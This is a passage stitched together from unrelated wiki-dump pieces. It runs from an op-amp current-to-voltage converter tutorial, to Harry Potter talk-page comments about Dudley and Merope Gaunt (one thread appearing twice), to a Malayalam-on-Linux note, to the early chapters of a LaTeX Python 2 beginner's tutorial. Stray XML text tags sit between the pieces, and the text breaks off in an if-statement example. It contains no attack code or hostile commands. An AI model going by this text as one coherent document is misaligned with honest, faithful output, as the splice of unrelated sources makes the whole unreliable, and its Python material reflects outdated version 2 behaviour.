In this way, we have managed to know how to convert this imperfect passive circuit into an almost ideal op-amp one. Then we were interesting mainly in the circuit structure rather than the circuit operation; that is why we have built the circuit step-by-step following the basic &quot;helping&quot; idea. That would be enough for us, if we were students, hobbysts and technicians who intend just to use this circuit for personal purposes.

&lt;br style=&quot;clear:both;&quot;/&gt;

== Visualizing the active current-to-voltage converter ==

Only, this is not sufficient, if we are teachers who want to present the circuit operation so that their students to really understand it. In this case we have to get these young people interested in the circuit operation; we have to show them in a more attractive way how the active elements (a man and an op-amp) implement the &quot;helping&quot; idea. For this purpose, we may use here a set of favorite heuristic visualizing tools: voltage bars, voltage diagrams, current loops and superimposed IV curves.

Let's first look at Fig. 2. Do you note that the voltages and voltage drops across the components B&lt;sub&gt;IN&lt;/sub&gt; and Ri are positive while the voltages across the components R, B&lt;sub&gt;H&lt;/sub&gt; and L are negative?

[[Image:Active_i-to-v_attr_locating_elements_1000.jpg|center|thumb|790px|Fig. 2. The voltages across the components B&lt;sub&gt;IN&lt;/sub&gt; and Ri are positive while the voltages across the components R, B&lt;sub&gt;H&lt;/sub&gt; and L are negative.]]

&lt;br style=&quot;clear:both;&quot;/&gt;

Then, we may rearrange them in a more suitable form, in order to superimpose the visualizing elements over the circuit diagram (see Fig. 3a below). For this purpose, let's first draw a light red line across the middle of the sheet dividing the plotting area into two parts: a positive upper area and a negative lower area. Then, let's place the elements with positive voltages across them (the excitation voltage source V&lt;sub&gt;IN&lt;/sub&gt; and the internal resistance Ri) in the upper part and the elements with negative voltages across them (the helping voltage source V&lt;sub&gt;H&lt;/sub&gt;, the resistor R and the load L) in the lower part. ''A tip'': think of the red line as a &quot;sea level&quot;; all &quot;positive things&quot; are located &quot;above the sea level&quot; while all &quot;negative things&quot; are &quot;under the sea level&quot;. Let's now begin experimenting.

=== Exploring the circuit at positive input voltage ===

==== ... by voltage bars and current loops ====

If you apply a positive input voltage V&lt;sub&gt;IN&lt;/sub&gt; (Fig. 3a), a current begins flowing through the circuit in a direction V&lt;sub&gt;IN&lt;/sub&gt; &gt;&gt;&gt; Ri &gt;&gt;&gt; R &gt;&gt;&gt; V&lt;sub&gt;H&lt;/sub&gt;. Figuratively speaking, you make the input source &quot;pull&quot; the point A up toward the positive voltage V&lt;sub&gt;IN&lt;/sub&gt; (you, the input source and the resistance Ri &quot;emerge from the sea&quot;:). Only, I observe to my great displeasure that the needle deflects to the right and immediately react by decreasing the compensating voltage V&lt;sub&gt;H&lt;/sub&gt;. Now, I make it &quot;pull&quot; the point A down toward the negative voltage -V&lt;sub&gt;H&lt;/sub&gt; (I, the &quot;helping&quot; source, the resistor R and the load &quot;sink into the see&quot;:) until it manages to zero the potential V&lt;sub&gt;A&lt;/sub&gt; (the [[Wikipedia:Virtual ground|virtual ground]]). Note how clear it is in this arrangement that the two voltage sources are connected in series, in one and the same direction (- V&lt;sub&gt;IN&lt;/sub&gt; +, - V&lt;sub&gt;H&lt;/sub&gt; +) so that their voltages are added. Actually, they constitute a new compound voltage source, which serves as a &quot;helped&quot; source producing a corrected input voltage.

[[Image:Active_i-to-v_converter_attr_pos_1000.jpg|center|thumb|790px|Fig. 3a. Exploring the circuit  at positive input voltage by means of voltage bars and current loops (go to Stage 3 in the interactive [http://www.circuit-fantasia.com/collections/tools/pnfb-builder.html circuit builder] to enjoy a ''flash'' animation).]]

&lt;br style=&quot;clear:both;&quot;/&gt;

==== ... by superimposed IV curves ====

On the graphical presentation (Fig. 3b), when the IV curve of the input voltage source moves horizontally from left to right, the IV curve of the &quot;helping&quot; voltage source moves horizontally from right to left and v.v. As a result, the operating point A slides along a new vertical IV curve, which represents the zero dynamic resistance R&lt;sub&gt;d&lt;/sub&gt; of the virtual ground.

[[Image:Active_i-to-v_attr_iv_curves_pos_1000.jpg|center|thumb|790px|Fig. 3b. The operating point A slides vertically along a new vertical IV curve, which represents the zero dynamic resistance R&lt;sub&gt;d&lt;/sub&gt; of the virtual ground.]]

&lt;br style=&quot;clear:both;&quot;/&gt;


=== Exploring the circuit at negative input voltage ===

==== ... by voltage bars and current loops ====

If you apply a negative input voltage V&lt;sub&gt;IN&lt;/sub&gt; under the ground, a current begins flowing through the circuit in an opposite direction: V&lt;sub&gt;IN&lt;/sub&gt; &gt;&gt;&gt; V&lt;sub&gt;H&lt;/sub&gt; &gt;&gt;&gt; R &gt;&gt;&gt; Ri. Now, you make the input source &quot;pull&quot; the point A down toward the negative voltage -V&lt;sub&gt;IN&lt;/sub&gt; (you, the input source and the resistance Ri &quot;sink into the see&quot;:). Only, I observe that the needle deflects to the left and immediately react by increasing the compensating voltage V&lt;sub&gt;H&lt;/sub&gt;. Now, I make it &quot;pull&quot; the point A up toward the positive voltage V&lt;sub&gt;H&lt;/sub&gt; (I, the &quot;helping&quot; source, the resistor R and the load &quot;emerge from the sea&quot;) until it manages to zero again the potential V&lt;sub&gt;A&lt;/sub&gt; (the [[Wikipedia:Virtual ground|virtual ground]]). The two voltage sources are connected in series again, in one and the same direction so that their voltages are added. Actually, they constitute again a new compound voltage source, which serves as a &quot;helped&quot; source producing a corrected input voltage.

[[Image:Active_i-to-v_converter_attr_neg_1000.jpg|center|thumb|790px|Fig. 4a. Exploring the circuit  at negative input voltage by means of voltage bars and current loops]]

&lt;br style=&quot;clear:both;&quot;/&gt;


==== ... by superimposed IV curves ====

On the graphical presentation (Fig. 4b), when the IV curve of the input voltage source moves horizontally from left to right, the IV curve of the &quot;helping&quot; voltage source moves horizontally from right to left and v.v. As a result, the operating point A slides along a new vertical IV curve, which represents the zero dynamic resistance R&lt;sub&gt;d&lt;/sub&gt; of the virtual ground.

[[Image:Active_i-to-v_attr_iv_curves_neg_1000.jpg|center|thumb|790px|Fig. 4b. The operating point A slides vertically along a new vertical IV curve, which represents the zero dynamic resistance R&lt;sub&gt;d&lt;/sub&gt; of the virtual ground.]]

&lt;br style=&quot;clear:both;&quot;/&gt;

== Visualizing the op-amp inverting current-to-voltage converter ==

Finally, we decide to make an op-amp do this boring work. For this purpose, we connect the op-amp's output in the place of the &quot;helping&quot; voltage source and the op-amp's input to point A so that the op-amp to &quot;help&quot; the input source. Let's now see how the op-amp does this magic.

=== Exploring the circuit at positive input voltage ===

If the input voltage V&lt;sub&gt;IN&lt;/sub&gt; increases, an input current I&lt;sub&gt;IN&lt;/sub&gt; begins flowing through the circuit (Fig. 5a). As a result, a voltage drop V&lt;sub&gt;R&lt;/sub&gt; appears across the resistor and the point A begins rising its potential V&lt;sub&gt;A&lt;/sub&gt; (the input source &quot;pulls&quot; the point A up toward the positive voltage V&lt;sub&gt;IN&lt;/sub&gt;). Only, the op-amp &quot;observes&quot; that to its great displeasure:( and immediately reacts: it decreases its output voltage &quot;sucking&quot; the current I&lt;sub&gt;IN&lt;/sub&gt; until it manages to zero the potential V&lt;sub&gt;A&lt;/sub&gt;. Figuratively speaking, the op-amp &quot;sinks into the see&quot;; it &quot;pulls&quot; the point A down toward the negative voltage -V to establish a virtual ground. It does this magic by connecting a part of the voltage produced by the negative power supply -V in series with the input voltage V&lt;sub&gt;IN&lt;/sub&gt;. The two voltage sources are connected in series, in one and the same direction (- V&lt;sub&gt;IN&lt;/sub&gt; +, - V&lt;sub&gt;H&lt;/sub&gt; +) so that their voltages are added.

[[Image:Op-amp_i-to-v_pos_1000.jpg|center|thumb|790px|Fig. 5a. The op-amp &quot;sinks into the see&quot; when the input source &quot;emerges from the see&quot; (go to Stage 4 in the interactive [http://www.circuit-fantasia.com/collections/tools/pnfb-builder.html circuit builder] to enjoy the animation).]]

&lt;br style=&quot;clear:both;&quot;/&gt;

=== Exploring the circuit at negative input voltage ===

If the input voltage V&lt;sub&gt;IN&lt;/sub&gt; decreases under the ground, an input current I&lt;sub&gt;IN&lt;/sub&gt; begins flowing through the circuit in an opposite direction (Fig. 5b). As a result, a voltage drop V&lt;sub&gt;R&lt;/sub&gt; appears across the resistor R and the point A begins dropping its potential V&lt;sub&gt;A&lt;/sub&gt; (now, the input source &quot;pulls&quot; the point A down toward the negative voltage -V&lt;sub&gt;IN&lt;/sub&gt;). Only, the op-amp &quot;observes&quot;' that and immediately reacts: it increases its output voltage &quot;pushing out&quot; the current I&lt;sub&gt;IN&lt;/sub&gt; until it manages to zero the potential V&lt;sub&gt;A&lt;/sub&gt; (now, the op-amp &quot;emerges from the see&quot; and &quot;pulls&quot; the point A up toward the positive voltage +V, in order to establish a virtual ground). It does this magic by connecting a part of the voltage produced by the positive power supply +V in series with the input voltage V&lt;sub&gt;IN&lt;/sub&gt;. The two voltage sources are connected in series again, in one and the same direction so that their voltages are added.

[[Image:Op-amp_i-to-v_neg_1000.jpg|center|thumb|790px|Fig. 5b. The op-amp &quot;emerges from the see&quot; when the input source &quot;sinks into the see&quot;.]]

      <text xml:space="preserve">== '''Re: Whether Dudley will exhibit magical tendencies in Deathly Hallows''' ==
The quote referred to was made by Jo in March of 1999, before the publication of Prisoner of Azkaban.  Here it is in it's entirety:

&quot;In my books, magic almost always shows itself in a person before age 11; however, there is a character who does manage in desperate circumstances to do magic quite late in life, but that is very rare in the world I am writing about.&quot;
--[[http://www.accio-quote.org/articles/1999/0399-barnesandnoble.html#magic]]

There is no indication that this quote refers to Dudley, or that the character will appear in Deathly Hallows.  I believe that it referred to Merope Gaunt, who was thought a Squib but was able to perform magic in later life to protect herself from her father.

:I'm sorry, I have to disagree. Granted, both of the Gaunts called Merope a Squib, but she was quite clearly doing magic, albeit weakly, when we first saw her in the hut. The fact that they abused her and denigrated her magical abilities does not imply that she was, in fact, a squib; and if she was, they would have been a lot more surprised when she suddenly started magically defending herself from her father.

:Because this is rather an out-of-the-way place for this comment, I'll copy it to the discussion page of Chapter 1 of OotP, which is after all what we are discussing. [[User:Chazz|Chazz]] &lt;small&gt;([[User talk:Chazz|talk]])&lt;/small&gt; 22:34, 6 July 2007 (UTC)</text>

Hello,
I have included a Howto for GNU/Linux and *BSD*s which uses GNU tools to get Malayalam rendered.Hope this helps new Malayalee and all Linux users.
the best support for Malayalam is with Debian Gnu/Linux.
thanks,Prakash Jose Kokkattu [[User:59.93.42.29|59.93.42.29]] 20:25, 6 July 2007 (UTC)</text>

      <text xml:space="preserve">== '''Re: Whether Dudley will exhibit magical tendencies in Deathly Hallows''' ==
The quote referred to was made by Jo in March of 1999, before the publication of Prisoner of Azkaban.  Here it is in its entirety:

&quot;In my books, magic almost always shows itself in a person before age 11; however, there is a character who does manage in desperate circumstances to do magic quite late in life, but that is very rare in the world I am writing about.&quot;
--[[http://www.accio-quote.org/articles/1999/0399-barnesandnoble.html#magic quoted here]]

There is no indication that this quote refers to Dudley, or that the character will appear in Deathly Hallows.  I believe that it referred to Merope Gaunt, who was thought a Squib but was able to perform magic in later life to protect herself from her father.

:I'm sorry, I have to disagree. Granted, both of the Gaunts called Merope a Squib, but she was quite clearly doing magic, albeit weakly, when we first saw her in the hut. The fact that they abused her and denigrated her magical abilities does not imply that she was, in fact, a squib; and if she was, they would have been a lot more surprised when she suddenly started magically defending herself from her father. [[User:Chazz|Chazz]] &lt;small&gt;([[User talk:Chazz|talk]])&lt;/small&gt; 22:35, 6 July 2007 (UTC)

:Having checked the book, I can confirm at this point that Merope was using magic and therefore was not a squib. Shortly after Ogden entered the hut, Merope dropped a pot; she stooped to pick it up, and Marvolo demanded that she use her wand. She dropped the pot again, and tried to spell the pot back up with her wand; instead it flew away across the floor and broke against the wall. True, the spell she was trying to use failed, but from her appearance she was very flustered, and without formal training it is extremely likely that she just fumbled. (I do not believe that Marvolo would have sent his daughter to Hogwarts, with the likes of Dumbledore there. Dippet might have been headmaster, but Dumbledore would have been teaching Transfiguration at that point.) I must correct myself also on one point: at no time does Merope ever use magic to defend herself from her father. To be precise: at no point does Merope defend herself, or Bob Ogden, from her father or her brother. [[User:Chazz|Chazz]] &lt;small&gt;([[User talk:Chazz|talk]])&lt;/small&gt; 18:22, 8 July 2007 (UTC)

::One further item: Rowling later said that the plot line had changed since the 1999 interview, and it was no longer necessary for the character mentioned, to do any magic at all. So that part of things was dropped. [[User:Chazz|Chazz]] &lt;small&gt;([[User talk:Chazz|talk]])&lt;/small&gt; 19:24, 2 April 2008 (UTC)

:I think there is a very big mistake in this analysis. It's quite clear that Muggles (and Squib) cannot SEE the Dementors but it's never said that they can't FEEL them. In the first chapter of the Half-Blood Prince, the two minister discuss the general depressive feelings that the Muggle population shows and the mist that seems to cover all England. Both phenomenon are told to be linked with dementors. During the two last books, we hear about multiple Dementors attack with some against Muggles. There is no reason at all that Dudley (still being a perfect Muggle) can't be attacked by a dementor.

::Did we hear of Dementors attacking Muggles? Apart from Dudley, I don't recall any. [[User:Chazz|Chazz]] &lt;small&gt;([[User talk:Chazz|talk]])&lt;/small&gt; 01:12, 11 January 2011 (UTC)

== Cracking noise ==

Shouldn't that &quot;loud, echoing ''crack''&quot; be explained in a little more detail? Especially since this Guide's coverage of the next chapter doesn't mention it at all... -- [[Special:Contributions/188.27.167.164|188.27.167.164]] ([[User talk:188.27.167.164|discuss]]) 23:52, 20 August 2011 (UTC)</text>

Non-Programmers Tutorial For Python is a tutorial designed to be a introduction to the Python programming language.  This guide is for someone with no programming experience.

If you have programmed in other languages I recommend using The Python Tutorial written by Guido van Rossum.

\chapter{Intro}

\section{First things first}

So, you've never programmed before.  As we go through this tutorial I
will attempt to teach you how to program.  There really is only one
way to learn to program.  {\bf You} must read code and write code.
I'm going to show you lots of code.  You should type in code that I
show you to see what happens.  Play around with it and make changes.
The worst that can happen is that it won't work.  When I type in code
it will be formatted like this:

\begin{verbatim}
##Python is easy to learn
print &quot;Hello, World!&quot;
\end{verbatim}

That's so it is easy to distinguish from the other text.  To make it confusing I will also print what the computer outputs in that same font.

Now, on to more important things.  In order to program in Python you need the Python software.  If you don't already have the Python software go to http://www.python.org/download/ and get the proper version for your platform.  Download it, read the instructions and get it installed.  

\section{Installing Python}
First you need to download the appropriate file for your computer from \url{http://www.python.org/download}.  Go to the 2.0 link (or newer) and then get the windows installer if you use Windows or the rpm or source if you use Unix.  

The Windows installer will download to file.  The file can then be run by double clicking on the icon that is downloaded.  The installation will then proceed.

If you get the Unix source make sure you compile in the tk extension if you want to use IDLE.

\section{Interactive Mode}
Go into IDLE (also called the Python GUI).  You should see a window that has some text like this:
\begin{verbatim}
Python 2.0 (#4, Dec 12 2000, 19:19:57) 
[GCC 2.95.2 20000220 (Debian GNU/Linux)] on linux2
Type &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
IDLE 0.6 -- press F1 for help
&gt;&gt;&gt; 
\end{verbatim}
The \verb'&gt;&gt;&gt;' is Python way of telling you that you are in
interactive mode.  In interactive mode what you type is immediately
run.  Try typing \verb'1+1' in. Python will respond with \verb'2'.
Interactive mode allows you to test out and see what Python will do.
If you ever feel you need to play with new Python statements go into
interactive mode and try them out.

\section{Creating and Running Programs}
\label{create}
Go into IDLE if you are not already.  Go to \verb'File' then \verb'New Window'.  In this window type the following:
\begin{verbatim}
print &quot;Hello, World!&quot;
\end{verbatim}

First save the program.  Go to \verb'File' then \verb'Save'.  Save it as \file{hello.py}.  (If you want you can save it to some other directory than the default.)  Now that it is saved it can be run.  

Next run the program by going to \verb'Run' then \verb'Run Module' (or if you have a older version of IDLE use \verb'Edit' then \verb'Run script').  This will output \verb'Hello, World!' on the \verb'*Python Shell*' window.  

Confused still?  Try this tutorial for IDLE at \url{http://hkn.eecs.berkeley.edu/~dyoo/python/idle_intro/index.html}

\section{Using Python from the command line}
If you don't want to use Python from the command line, you don't have too, just use IDLE.  To get into interactive mode just type \verb'python' with out any arguments.  To run a program create it with a text editor (Emacs has a good python mode) and then run it with \verb'python program name'.  


%%Now for our first lesson, what is a computer program?  A computer program is a set of very detailed instructions that tell a computer what to do.  

%%TODO add section explaining how to run python programs
\chapter{Hello, World}
\section{What you should know}
You should know how to edit programs in a text editor or IDLE, save them to disk (floppy or hard) and run them once they have been saved.

\section{Printing}
Programming tutorials since the beginning of time have started with a little program called Hello, World!  So here it is:

\begin{verbatim}
print &quot;Hello, World!&quot;
\end{verbatim}

If you are using the command line to run programs then type it in with a text editor, save it as \file{hello.py} and run it with \type{python hello.py}

Otherwise go into IDLE, create a new window, and create the program as
in section \ref{create}.

When this program is run here's what it prints:

\begin{verbatim}
Hello, World!
\end{verbatim}

Now I'm not going to tell you this every time, but when I show you a
program I recommend that you type it in and run it.  I learn better
when I type it in and you probably do too.

Now here is a more complicated program:

\begin{verbatim}
print &quot;Jack and Jill went up a hill&quot;
print &quot;to fetch a pail of water;&quot;
print &quot;Jack fell down, and broke his crown,&quot;
print &quot;and Jill came tumbling after.&quot;
\end{verbatim}

When you run this program it prints out:

\begin{verbatim}
Jack and Jill went up a hill
to fetch a pail of water;
Jack fell down, and broke his crown,
and Jill came tumbling after.
\end{verbatim}

When the computer runs this program it first sees the line:
\begin{verbatim}
print &quot;Jack and Jill went up a hill&quot;
\end{verbatim}
 so the computer prints:
\begin{verbatim}
Jack and Jill went up a hill
\end{verbatim}

Then the computer goes down to the next line and sees:
\begin{verbatim}
print &quot;to fetch a pail of water;&quot;
\end{verbatim}

So the computer prints to the screen:
\begin{verbatim}
to fetch a pail of water;
\end{verbatim}

The computer keeps looking at each line, follows the command and then goes on to the next line.  The computer keeps running commands until it reaches the end of the program.  

\section{Expressions}
Here is another program:
\begin{verbatim}
print &quot;2 + 2 is&quot;, 2+2
print &quot;3 * 4 is&quot;, 3 * 4
print 100 - 1, &quot; = 100 - 1&quot;
print &quot;(33 + 2) / 5 + 11.5 = &quot;,(33 + 2) / 5 + 11.5  
\end{verbatim}

And here is the output when the program is run:

\begin{verbatim}
2 + 2 is 4
3 * 4 is 12
99  = 100 - 1
(33 + 2) / 5 + 11.5 =  18.5
\end{verbatim}

As you can see Python can turn your thousand dollar computer into a 5 dollar calculator.  

Python has six basic operations for numbers: 

\begin{tabular}{l | c | l}
Operation &amp; Symbol &amp; Example \\
\hline
Exponentiation &amp; \verb'**' &amp; \verb'5 ** 2 == 25' \\
Multiplication &amp; \verb'*' &amp; \verb'2 * 3 == 6' \\
Division &amp; \verb'/' &amp; \verb'14 / 3 == 4' \\
Remainder &amp; \verb'%' &amp; \verb'14 % 3 == 2' \\
Addition &amp; \verb'+' &amp; \verb'1 + 2 == 3' \\
Subtraction &amp; \verb'-' &amp; \verb'4 - 3 == 1' \\
\end{tabular}

Notice that division follows the rule, if there are no decimals to start with, there will be no decimals to end with. (Note: This will be changing in Python 2.3) The following program shows this:
\begin{verbatim}
print &quot;14 / 3 = &quot;,14 / 3
print &quot;14 % 3 = &quot;,14 % 3
print
print &quot;14.0 / 3.0 =&quot;,14.0 / 3.0
print &quot;14.0 % 3.0 =&quot;,14 % 3.0
print
print &quot;14.0 / 3 =&quot;,14.0 / 3
print &quot;14.0 % 3 =&quot;,14.0 % 3
print
print &quot;14 / 3.0 =&quot;,14 / 3.0
print &quot;14 % 3.0 =&quot;,14 % 3.0
print
\end{verbatim}
With the output:
\begin{verbatim}
14 / 3 =  4
14 % 3 =  2

14.0 / 3.0 = 4.66666666667
14.0 % 3.0 = 2.0

14.0 / 3 = 4.66666666667
14.0 % 3 = 2.0

14 / 3.0 = 4.66666666667
14 % 3.0 = 2.0

\end{verbatim}
Notice how Python gives different answers for some problems depending on whether or not there decimal values are used.  

The order of operations is the same as in math:
\begin{enumerate}
\item parentheses \verb'()'
\item exponents \verb'**'
\item multiplication \verb'*', division \verb'\', and remainder \verb'%' 
\item addition \verb'+' and subtraction \verb'-'
\end{enumerate}

\section{Talking to humans (and other intelligent beings)}

Often in programming you are doing something complicated and may not in the future remember what you did.  When this happens the program should probably be commented.  A comment is a note to you and other programmers explaining what is happening.  For example:
\begin{verbatim}
#Not quite PI, but an incredible simulation
print 22.0/7.0
\end{verbatim}
Notice that the comment starts with a \verb'#'. Comments are used to communicate with others who read the program and your future self to make clear what is complicated. 

\section{Examples}
Each chapter (eventually) will contain examples of the programming features introduced in the chapter.  You should at least look over them see if you understand them.  If you don't, you may want to type them in and see what happens.  Mess around them, change them and see what happens.  

Denmark.py
\begin{verbatim}
print &quot;Something's rotten in the state of Denmark.&quot;
print &quot;                -- Shakespeare&quot;
\end{verbatim}

Output:
\begin{verbatim}
Something's rotten in the state of Denmark.
                -- Shakespeare
\end{verbatim}

School.py
\begin{verbatim}
#This is not quite true outside of USA
# and is based on my dim memories of my younger years
print &quot;Firstish Grade&quot;
print &quot;1+1 =&quot;,1+1
print &quot;2+4 =&quot;,2+4
print &quot;5-2 =&quot;,5-2
print
print &quot;Thirdish Grade&quot;
print &quot;243-23 =&quot;,243-23
print &quot;12*4 =&quot;,12*4
print &quot;12/3 =&quot;,12/3
print &quot;13/3 =&quot;,13/3,&quot; R &quot;,13%3
print
print &quot;Junior High&quot;
print &quot;123.56-62.12 =&quot;,123.56-62.12
print &quot;(4+3)*2 =&quot;,(4+3)*2
print &quot;4+3*2 =&quot;,4+3*2
print &quot;3**2 =&quot;,3**2
print
\end{verbatim}

Output:
\begin{verbatim}
Firstish Grade
1+1 = 2
2+4 = 6
5-2 = 3

Thirdish Grade
243-23 = 220
12*4 = 48
12/3 = 4
13/3 = 4  R  1

Junior High
123.56-62.12 = 61.44
(4+3)*2 = 14
4+3*2 = 10
3**2 = 9

\end{verbatim}

\section{Exercises}

Write a program that prints your full name and your birthday as separate strings.

Write a program that shows the use of all 6 math functions.

\chapter{Who Goes There?}
\section{Input and Variables}
Now I feel it is time for a really complicated program.  Here it is:
\begin{verbatim}
print &quot;Halt!&quot;
s = raw_input(&quot;Who Goes there? &quot;)
print &quot;You may pass,&quot;, s
\end{verbatim}

When {\bf I} ran it here is what {\bf my} screen showed:
\begin{verbatim}
Halt!
Who Goes there? Josh
You may pass, Josh
\end{verbatim}

Of course when you run the program your screen will look different
because of the \verb'raw_input' statement.  When you ran the program
you probably noticed (you did run the program, right?) how you had to
type in your name and then press Enter.  Then the program printed out
some more text and also your name.  This is an example of input.  The
program reaches a certain point and then waits for the user to input
some data that the program can use later.

Of course, getting information from the user would be useless if we didn't have anywhere to put that information and this is where variables come in.  In the previous program {\tt s} is a variable.  Variables are like a box that can store some piece of data.  Here is a program to show examples of variables:
\begin{verbatim}
a = 123.4
b23 = 'Spam'
first_name = &quot;Bill&quot;
b = 432
c = a + b
print &quot;a + b is&quot;, c
print &quot;first_name is&quot;, first_name
print &quot;Sorted Parts, After Midnight or&quot;,b23
\end{verbatim}

And here is the output:
\begin{verbatim}
a + b is 555.4
first_name is Bill
Sorted Parts, After Midnight or Spam
\end{verbatim}

Variables store data.  The variables in the above program are {\tt a}, {\tt b23}, \verb'first_name', {\tt b}, and {\tt c}.  The two basic types are strings and numbers.  Strings are a sequence of letters, numbers and other characters.  In this example {\tt b23} and \verb'first_name' are variables that are storing strings.  {\tt Spam}, {\tt Bill}, {\tt a + b is}, and \verb'first_name is' are the strings in this program.  The characters are surrounded by {\tt &quot;} or {\tt '}.  The other type of variables are numbers.  

Okay, so we have these boxes called variables and also data that can go into the variable.  The computer will see a line like \verb'first_name = &quot;Bill&quot;' and it reads it as Put the string {\tt Bill} into the box (or variable) \verb'first_name'.  Later on it sees the statement {\tt c = a + b} and it reads it as Put {\tt a + b} or {\tt 123.4 + 432} or {\tt 555.4} into {\tt c}.  

Here is another example of variable usage:
\begin{verbatim}
a = 1
print a
a = a + 1
print a
a = a * 2
print a
\end{verbatim}

And of course here is the output:
\begin{verbatim}
1
2
4
\end{verbatim}

Even if it is the same variable on both sides the computer still reads it as: First find out the data to store and than find out where the data goes.  

One more program before I end this chapter:
\begin{verbatim}
num = input(&quot;Type in a Number: &quot;)
str = raw_input(&quot;Type in a String: &quot;)
print &quot;num =&quot;, num
print &quot;num is a &quot;,type(num)
print &quot;num * 2 =&quot;,num*2
print &quot;str =&quot;, str
print &quot;str is a &quot;,type(str)
print &quot;str * 2 =&quot;,str*2
\end{verbatim}

The output I got was:
\begin{verbatim}
Type in a Number: 12.34
Type in a String: Hello
num = 12.34
num is a  &lt;type 'float'&gt;
num * 2 = 24.68
str = Hello
str is a  &lt;type 'string'&gt;
str * 2 = HelloHello
\end{verbatim}

Notice that \verb'num' was gotten with {\tt input} while \verb'str' was gotten with \verb'raw_input'.   \verb'raw_input' returns a string while {\tt input} returns a number.  When you want the user to type in a number use {\tt input} but if you want the user to type in a string use \verb'raw_input'.

The second half of the program uses {\tt type} which tells what a
variable is.  Numbers are of type {\tt int} or {\tt float} (which are
short for 'integer' and 'floating point' respectively).  Strings are
of type {\tt string}.  Integers and floats can be worked on by
mathematical functions, strings cannot.  Notice how when python
multiples a number by a integer the expected thing happens.  However
when a string is multiplied by a integer the string has that many
copies of it added i.e. \verb'str * 2 = HelloHello'.

The operations with strings do slightly different things than 
operations with numbers.  Here are some interative mode examples
to show that some more.

\begin{verbatim}
&gt;&gt;&gt; &quot;This&quot;+&quot; &quot;+&quot;is&quot;+&quot; joined.&quot;
'This is joined.'
&gt;&gt;&gt; &quot;Ha, &quot;*5
'Ha, Ha, Ha, Ha, Ha, '
&gt;&gt;&gt; &quot;Ha, &quot;*5+&quot;ha!&quot;
'Ha, Ha, Ha, Ha, Ha, ha!'
&gt;&gt;&gt; 
\end{verbatim}

Here is the list of some string operations:

\begin{tabular}{l | c | l}
Operation &amp; Symbol &amp; Example \\
\hline
Repetition &amp; \verb'*' &amp; \verb'&quot;i&quot;*5 == &quot;iiiii&quot;' \\
Concatenation &amp; \verb'+' &amp; \verb'&quot;Hello, &quot;+&quot;World!&quot; == &quot;Hello, World!&quot;' \\
\end{tabular}


%%n_1 = input(&quot;First Number? &quot;)
%%n_2 = input(&quot;Second Number? &quot;)
%%name = raw_input(&quot;Input your name:&quot;)
%%print name,&quot;, the sum of the first number and the second number is&quot;, n_1 + n_2
%%print &quot;n_1 =&quot;,repr(n_1)
%%print &quot;n_2 =&quot;,repr(n_2)
%%print &quot;name =&quot;,repr(name)
%%\end{verbatim}


%%You use {\tt raw_input} when you want to get a string from the user.  You use {\tt input} when you want to get a number.

\chapter{Count to 10}

\section{While loops}

Presenting our first control structure.  Ordinarily the computer starts with the first line and then goes down from there.  Control structures change the order that statements are executed or decide if a certain statement will be run.  Here's the source for a program that uses the while control structure:
\begin{verbatim}
a = 0
while a &lt; 10:
        a = a + 1
        print a
\end{verbatim}

And here is the extremely exciting output:
\begin{verbatim}
1
2
3
4
5
6
7
8
9
10
\end{verbatim}
 
(And you thought it couldn't get any worse after turning your computer into a five dollar calculator?)  So what does the program do?  First it sees the line {\tt a = 0} and makes a zero.  Then it sees {\tt while a &lt; 10:} and so the computer checks to see if {\tt a &lt; 10}.  The first time the computer sees this statement a is zero so it is less than 10.  In other words while a is less than ten the computer will run the tabbed in statements.  

Here is another example of the use of {\tt while}:
\begin{verbatim}
a = 1
s = 0
print 'Enter Numbers to add to the sum.'
print 'Enter 0 to quit.'
while a != 0 :
        print 'Current Sum:',s
        a = input('Number? ')
        s = s + a
print 'Total Sum =',s
\end{verbatim}
 
The first time I ran this program Python printed out:
\begin{verbatim}
  File &quot;sum.py&quot;, line 3
    while a != 0 
                ^
SyntaxError: invalid syntax
\end{verbatim}
I had forgotten to put the {\tt :} after the while.  The error message complained about that problem and pointed out where it thought the problem was with the \verb*&quot;^&quot; .  After the problem was fixed here was what I did with the program:
\begin{verbatim}
Enter Numbers to add to the sum.
Enter 0 to quit.
Current Sum: 0
Number? 200
Current Sum: 200
Number? -15.25
Current Sum: 184.75
Number? -151.85
Current Sum: 32.9
Number? 10.00
Current Sum: 42.9
Number? 0
Total Sum = 42.9
\end{verbatim}

Notice how {\tt print 'Total Sum =',s} is only run at the end.  The {\tt while} statement only affects the line that are tabbed in (a.k.a.\  indented).  The {\tt !=} means does not equal so {\tt while a != 0 :}  means until a is zero run the tabbed in statements that are afterwards.  

Now that we have while loops, it is possible to have programs that run forever.  An easy way to do this is to write a program like this:
\begin{verbatim}
while 1 == 1:
     print &quot;Help, I'm stuck in a loop.&quot;
\end{verbatim}

This program will output {\tt Help, I'm stuck in a loop.} until the heat death of the universe or you stop it.  The way to stop it is to hit the Control (or Ctrl) button and `c' (the letter) at the same time.  This will kill the program.  (Note: sometimes you will have to hit enter after the Control C.)

\section{Examples}

Fibonnacci.py
\begin{verbatim}
#This program calulates the fibonnacci sequence
a = 0
b = 1
count = 0
max_count = 20
while count &lt; max_count:
    count = count + 1
    #we need to keep track of a since we change it
    old_a = a
    old_b = b
    a = old_b
    b = old_a + old_b
    #Notice that the , at the end of a print statement keeps it
    # from switching to a new line
    print old_a,
print
\end{verbatim}

Output:
\begin{verbatim}
0 1 1 2 3 5 8 13 21 34 55 89 144 233 377 610 987 1597 2584 4181
\end{verbatim}

Password.py
\begin{verbatim}
# Waits until a password has been entered.  Use control-C to break out with out
# the password

#Note that this must not be the password so that the 
# while loop runs at least once.
password = &quot;foobar&quot;

#note that != means not equal
while password != &quot;unicorn&quot;:
    password = raw_input(&quot;Password:&quot;)
print &quot;Welcome in&quot;
\end{verbatim}

Sample run:
\begin{verbatim}Password:auo
Password:y22
Password:password
Password:open sesame
Password:unicorn
Welcome in
\end{verbatim}


\chapter{Decisions}

\section{If statement}
As always I believe I should start each chapter with a warm up typing exercise so here is a short program to compute the absolute value of a number:
\begin{verbatim}
n = input(&quot;Number? &quot;)
if n &lt; 0:
        print &quot;The absolute value of&quot;,n,&quot;is&quot;,-n
else:
        print &quot;The absolute value of&quot;,n,&quot;is&quot;,n
\end{verbatim}

Here is the output from the two times that I ran this program:
\begin{verbatim}
Number? -34
The absolute value of -34 is 34

Number? 1
The absolute value of 1 is 1
\end{verbatim}

